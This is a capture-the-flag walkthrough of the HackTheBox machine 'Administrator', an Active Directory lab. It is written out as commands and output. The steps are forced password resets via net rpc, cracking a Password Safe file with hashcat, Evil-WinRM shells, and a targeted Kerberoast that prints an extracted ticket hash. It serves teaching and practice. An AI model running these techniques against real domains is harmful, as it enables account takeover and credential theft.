---
title: HTB: Administrator
url: https://0xdf.gitlab.io/2025/04/19/htb-administrator.html
date: 2025-04-19T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-administrator, ctf, nmap, assume-breach, active-directory, netexec, evil-winrm, bloodhound, bloodhound-python, bloodhound-ce, genericall, password-safe, hashcat, genericwrite, targeted-kerberoast, targetedkerberoast-py, youtube, python-uv, dcsync, secretsdump, htb-blazorized, oscp-like-v3, cpts-like
---

![Administrator](/img/administrator-cover.png)

Administrator is a pure Active Directory challenge. I’ll start with creds for a user, and use them to collect Bloodhound data on the domain. I’ll find that I can modify a user’s password, and that user can modify another user’s password. That user has access to an FTP share where I’ll find a Password Safe file. I’ll crack the password to recover more passwords, pivoting to the next user. This user has GenericWrite over another user, which I’ll abuse with a targeted Kerberoasting attack. Finally, I’ll do a DCSync attack to dump the domain administrator’s hash and completely compromise the domain.

## Box Info

| Name | [Administrator](https://hackthebox.com/machines/administrator)  [Administrator](https://hackthebox.com/machines/administrator) [Play on HackTheBox](https://hackthebox.com/machines/administrator) |
| --- | --- |
| Release Date | [09 Nov 2024](https://twitter.com/hackthebox_eu/status/1854894166787883432) |
| Retire Date | 19 Apr 2025 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Administrator |
| Radar Graph | Radar chart for Administrator |
| First Blood User | 00:06:01[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:09:06[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [nirza nirza](https://app.hackthebox.com/users/800960) |
| Scenario | As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich |

## Recon

### nmap

`nmap` finds many open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:14 GMT
Nmap scan report for 10.10.11.42
Host is up (0.14s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
54317/tcp open  unknown
54320/tcp open  bo2k
54331/tcp open  unknown
54336/tcp open  unknown
54339/tcp open  unknown
54358/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds
oxdf@hacky$ nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:16 GMT
Nmap scan report for 10.10.11.42
Host is up (0.14s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-16 05:16:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-16T05:17:07
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds

```

The box looks like a [Windows domain controller](/cheatsheets/os#windows-domain-controller) (Kerberos, LDAP, SMB, etc). It also has WinRM (5985) open if I find creds for a user with those permissions.

FTP is open which isn’t standard for a DC. I’ll want to check that out.

The domain name `administrator.htb` shows on the LDAP script output. There’s also a hostname, DC. I’ll add these to my `/etc/hosts` file using `netexec`:

```

oxdf@hacky$ netexec smb 10.10.11.42 --generate-hosts-file /etc/hosts
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)

```

This add the line:

```
10.10.11.42    DC DC.administrator.htb administrator.htb

```

### Initial Credentials

HackTheBox provides the following message associated with the Administrator machine:

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account:  
Username: Olivia Password: ichliebedich

I am given credentials for a low priv user (Olivia, password “ichliebedich”) at the start of the box. This is meant to reflect many real world pentests that start this way. I’ll verify they do work over SMB:

```

oxdf@hacky$ netexec smb 10.10.11.42 -u olivia -p ichliebedich
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich

```

They also work for WinRM, though I’m not sure if that is intended:

```

oxdf@hacky$ netexec winrm 10.10.11.42 -u olivia -p ichliebedich
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)

```

They do not work for FTP:

```

oxdf@hacky$ netexec ftp 10.10.11.42 -u olivia -p ichliebedich
FTP         10.10.11.42     21     10.10.11.42      [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)

```

Given this access, I’ll want to prioritize things like:
- WinRM / filesystem enumeration
- SMB shares
- Bloodhound (which includes most of the data from LDAP)
- ADCS

### Shell as Olivia

I’m able to get a WinRM shell as Olivia:

```

oxdf@hacky$ evil-winrm -i administrator.htb -u olivia -p ichliebedich
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>

```

The filesystem is not very interesting. There’s no files in olivia’s home directory:

```
*Evil-WinRM* PS C:\Users\olivia> tree /f .
Folder PATH listing
Volume serial number is 000001D1 6131:DE70
C:\USERS\OLIVIA
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos

```

At the file root, there’s the standard Windows stuff:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2024   1:05 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        10/30/2024   4:53 PM                Program Files
d-----        10/30/2024   4:42 PM                Program Files (x86)
d-r---         4/15/2025   3:20 PM                Users
d-----         11/1/2024   1:50 PM                Windows

```

`inetpub` has the `ftproot`, but olivia can’t access it:

```
*Evil-WinRM* PS C:\inetpub> ls

    Directory: C:\inetpub

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2024   1:05 PM                custerr
d-----         10/5/2024   7:14 PM                ftproot
d-----         11/1/2024   1:27 PM                history
d-----         10/5/2024   9:59 AM                logs
d-----         10/5/2024   9:59 AM                temp
*Evil-WinRM* PS C:\inetpub> ls ftproot
Access to the path 'C:\inetpub\ftproot' is denied.
At line:1 char:1
+ ls ftproot
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\ftproot:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

The only special group Olivia has is the “Remote Management Users” group:

```
*Evil-WinRM* PS C:\inetpub> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

### FTP - TCP 21

I’ll check for anonymous login over FTP, but it doesn’t work:

```

oxdf@hacky$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:oxdf): anonymous
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed

```

I’ll have to come back when I have creds.

### SMB - TCP 445

The guest account is disabled and a fake username doesn’t work to get SMB access:

```

oxdf@hacky$ netexec smb administrator.htb -u guest -p '' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb administrator.htb -u 0xdf -p '' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\0xdf: STATUS_LOGON_FAILURE 

```

I’ll use the provided creds to enumerate shares:

```

oxdf@hacky$ netexec smb administrator.htb -u olivia -p ichliebedich --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 

```

The shares match the default share names for a domain controller. I can do things like list users:

```

oxdf@hacky$ netexec smb administrator.htb -u olivia -p ichliebedich --users
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0        
SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR

```

I don’t need to go much further here, but rather go to Bloodhound.

### Bloodhound

#### Collection

I’ll use the [Python Bloodhound collector](https://github.com/dirkjanm/BloodHound.py) to get Bloodhound data:

```

oxdf@hacky$ bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20241116053818_bloodhound.zip

```

I am making sure to run the `bloodhound-ce` branch of the collector (per [this post](https://github.com/dirkjanm/BloodHound.py/issues/138#issuecomment-1829502197)).

#### Analysis

I’ll start Bloodhound-CE in a Docker container (see my [Blazoried post](/2024/11/09/htb-blazorized.html#bloodhound) for details) and load the data. I’ll start by finding Olivia and marking them as owned. Bloodhound shows one user with outbound control:

![image-20241115181154270](/img/image-20241115181154270.png)

michael is in the Remote Management Users group as well:

![image-20241116160939456](/img/image-20241116160939456.png)

This means if I can get their creds, I can connect with Evil-WinRM.

## Shell as michael

### Change Password

The most straight forward way to abuse `GenericAll` is to change the michael user’s password. Bloodhound shows how to do this from Linux:

![image-20241116160756713](/img/image-20241116160756713.png)

I’ll use `net` just like it suggests:

```

oxdf@hacky$ net rpc password "michael" "0xdf0xdf." -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42

```

It works:

```

oxdf@hacky$ netexec smb 10.10.11.42 -u michael -p '0xdf0xdf.'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:0xdf0xdf. 

```

It works for WinRM as well:

```

oxdf@hacky$ netexec winrm 10.10.11.42 -u michael -p '0xdf0xdf.'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:0xdf0xdf. (Pwn3d!)

```

### Shell

With these creds, I’ll get a shell:

```

oxdf@hacky$ evil-winrm -i administrator.htb -u michael -p 0xdf0xdf.
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>

```

I don’t believe there’s a cleanup script on the box resetting michael’s password, though if I’m playing in a shared lab, I’ll have to be aware that others could change it.

## Auth as benjamin

### Enumeration

In the Bloodhound data, michael has `ForceChangePassword` over benjamin:

![image-20241116161754037](/img/image-20241116161754037.png)

### Change Password

I’ll do the same steps as above to change benjamin’s password:

```

oxdf@hacky$ net rpc password "benjamin" "0xdf0xdf." -U "administrator.htb"/"michael"%"0xdf0xdf." -S 10.10.11.42

```

It works for SMB:

```

oxdf@hacky$ netexec smb 10.10.11.42 -u benjamin -p '0xdf0xdf.'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:0xdf0xdf.

```

But not WinRM:

```

oxdf@hacky$ netexec winrm 10.10.11.42 -u benjamin -p '0xdf0xdf.'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:0xdf0xdf.

```

They do work for FTP!

```

oxdf@hacky$ netexec ftp administrator.htb -u benjamin -p 0xdf0xdf.
FTP         10.10.11.42     21     administrator.htb [+] benjamin:0xdf0xdf.

```

That’s because Benjamin is in the Share Moderates group, as I can see from my shell as Olivia:

```
*Evil-WinRM* PS C:\Users\olivia\Documents> net user benjamin
User name                    benjamin
Full Name                    Benjamin Brown
...[snip]...

Local Group Memberships      *Share Moderators
Global Group memberships     *Domain Users
The command completed successfully.

```

And Bloodhound:

![image-20250415170047931](/img/image-20250415170047931.png)

## Shell as emily

### FTP

On the FTP site, there’s only a single file:

```

oxdf@hacky$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:oxdf): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||60887|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.

```

I’ll download it:

```

ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||60902|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************|   952        6.67 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (6.66 KiB/s)

```

### Access Password Safe

The file is a Password Save V3 database:

```

oxdf@hacky$ file Backup.psafe3 
Backup.psafe3: Password Safe V3 database

```

Interestingly, the first line of the file is what has the encrypted password, so it can be passed directly the `hashcat`. It won’t auto-recognize:

```

$ hashcat Backup.psafe3 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 37 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   5200 | Password Safe v3                                           | Password Manager

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

The last one, 5200, is “Password Save v3”.

```

$ hashcat -m 5200 Backup.psafe3 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting
...[snip]...
Backup.psafe3:tekieromucho                                
...[snip]...

```

The password is “tekieromucho”.

### Password Safe

I’ll grab the latest version of Password Safe from the [release page on GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true) and install it with `sudo dpkg -i passwordsafe-debian12-1.20-amd64.deb`. When I run it, there’s a form that asks for the DB and password:

![image-20241116165154002](/img/image-20241116165154002.png)

I’ll fill it in with what I’ve got:

![image-20241116165241356](/img/image-20241116165241356.png)

It has three entries:

![image-20241116165359412](/img/image-20241116165359412.png)

### Validate Passwords

I’ll match each user to a username in Bloodhound, and test them with `netexec`:

```

oxdf@hacky$ netexec smb administrator.htb -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
oxdf@hacky$ netexec smb administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
oxdf@hacky$ netexec smb administrator.htb -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE

```

emily’s works. It works for WinRM as well:

```

oxdf@hacky$ netexec winrm administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)

```

### Shell

I’ll connect over Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> 

```

And grab the user flag:

```
*Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt
142aa43f************************

```

## Auth as ethan

### Enumeration

Bloodhound shows that emily has `GenericWrite` over ethan:

![image-20241117063839454](/img/image-20241117063839454.png)

### Targeted Kerberoast

#### Background

A Service Principal Name (SPN) is a unique identifier that associates a service instance with a service account in Kerberos. Kerberoasting is an attack where an authenticated user requests a ticket for a service by it’s SPN, and the ticket that comes back is encrypted with the password of the user associated with that service. If that password is weak, it can be broken in offline brute force. I first showed this attack in [Blazorized](/2024/11/09/htb-blazorized.html#targeted-kerberoast) (though there I had `WriteSPN` privilege, rather than `GenericWrite`).

#### Strategy

To perform a targeted kerberoast, I’ll use the `GenericWrite` privilege to give ethan an SPN. Then I can request a ticket for that fake service, and get a ticket encrypted with ethan’s password hash. If that password is weak, I can crack it offline.

Given I have a shell on the box, I could do this from either Windows or from my Linux host. I showed the Windows attack on [Blazorized](/2024/11/09/htb-blazorized.html#targeted-kerberoast), so I’ll do it from Linux here. Bloodhound gives full instructions for doing this:

![image-20241117065000695](/img/image-20241117065000695.png)

#### Get Hash

I’ll follow the [uv](https://github.com/astral-sh/uv) workflow from my recent video on [using uv to manage Python tools](https://www.youtube.com/watch?v=G36QXtBXKBQ):

I’ll clone the repo for `targetedkerberos.py` to my host, and add dependencies:

```

oxdf@hacky$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 65, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 65 (delta 14), reused 12 (delta 12), pack-reused 43 (from 1)
Receiving objects: 100% (65/65), 238.08 KiB | 7.21 MiB/s, done.
Resolving deltas: 100% (25/25), done.
oxdf@hacky$ cd targetedKerberoast/
oxdf@hacky$ uv add --script targetedKerberoast.py -r requirements.txt 
Updated `targetedKerberoast.py`

```

Now I’ll make sure my clock is synced and run the script, which will detect the user emily has write privileges on, add an SPN, get the hash, and then cleanup:

```

oxdf@hacky$ sudo ntpdate administrator.htb
2025-04-16 01:40:05.191473 (+0000) +26969.718771 +/- 0.046738 administrator.htb 10.10.11.42 s1 no-leap
CLOCK: time stepped by 26969.718771
oxdf@hacky$ uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Installed 26 packages in 24ms
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e7458cb1f13711cedb8f591a5d166b9f$5bdc26296cf7ba726129f27266a6b2ced2652c39df1b3767d526862f42aef7046aba3db017135fc1d2306ffacbf89dab46a2542de161be9f24b78c764a50bc2cd405745f3fa8ba778093dbc122f94bdbf695609efae0bc1c300368ab1f0191521d46c6a6c51025a6fff7465c82d949148991a364669163313e66e49d768e6d11cf5534fc965e9b9c02944f7e65ccbec29fb25a79fa13a5cfaba3bb4b350bd4f25ec7b879e962adbc4a596cb0be9cb78ad5c3455475db63cd5f96e3016eb70e7c2b7786c6a5d46048774db36d1b9fc591e19079fdb528282ff8bf6375c3a9de4e81448c75166d6b95efa91fb0bcc84d26f1a8bb00efde786215abfbf3eb54dbd4b61414892fda7ec04566d3c660a0fcca67a9b998a4f07b91cbee8b9ea39a60375565cfde0ca3b0f6e40f969eb2bd00f8b619e581377c0f64f0a7ce1f45f8d433c293201b22ab2d7b02abf4ad44bb62bfd4701876c9e8d747c319ff95c5691db3a7cdc04979ba824ad12333974e7473cde0ff7cf778e01ece8e0b1a52c138a28440b8339f0fe66d891d16db2cbdbb54ae6cfa0919f22ecf082f4643ebf8736c323ca6b569be52c4f4da59745f5130b2b0d948a324cac9b0687be2e735e6ec53a6a876568224eeec53efc456d58e5e984616703e3374163dfb9bd2e85cde2b04c61f51bdbd186c6d70a6e83344090c8bc2eb69880e6d24f5a8f7774a0524fba230fc7d063747febfc3cb237437b13c48603eec11856505167ec21486d030de4fb339054c83fcd7e192b23c8e8ab78bae97284de5079a210dbd76c775bdb3a3021d21c56557830186f12616f41e13dc465ea3a27ff55879eb6b44a34f97fa53a8206f217ec24abe199f5cbaf6945820c9e7f4dc89427bd5b1822c3bc5b4454c126a8f4ee0a6d50e49f646e777a3aad58b49661e1a0edf7260223c36fcc7b8ed2ad6136e1b138a0d69701097e97aaefae99219ce223432ac60d05029ec3eba127eb94d767085f2a5f7675ad2527a2def43c89c622a3f200702e298090040cc580266793ef2316b49a3545bac62be3e0200d86d59831eb06a99c7c376c34370e0543c9e9a552812639d